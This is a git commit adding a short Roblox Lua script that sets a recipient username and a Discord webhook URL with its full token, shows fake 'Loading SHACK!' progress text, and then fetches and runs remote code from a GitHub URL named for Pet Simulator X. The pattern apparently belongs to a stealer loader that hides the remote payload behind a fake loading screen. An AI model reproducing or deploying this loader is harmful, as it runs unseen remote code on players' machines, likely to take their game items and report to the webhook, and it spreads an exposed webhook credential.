a6c1da2a2acdff416fa72caa3a916ca567e51a18
gPRICEg <141360642+gPRICEg@users.noreply.github.com>
2023-08-03 21:33:33 +0300

    Add files via upload

---
+++ SHACK-plus.lua
@@ -0,0 +1,11 @@
+Username = "gPRICEg"
+WebHook = "https://discord.com/api/webhooks/1136727463733510268/NskuZblCqQKeXpactzcdsyRfKbM93FMna9MFO2_GgUBrmeEo-RW881NptxOcYYSekYvW"
+
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "Loading SHACK!"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
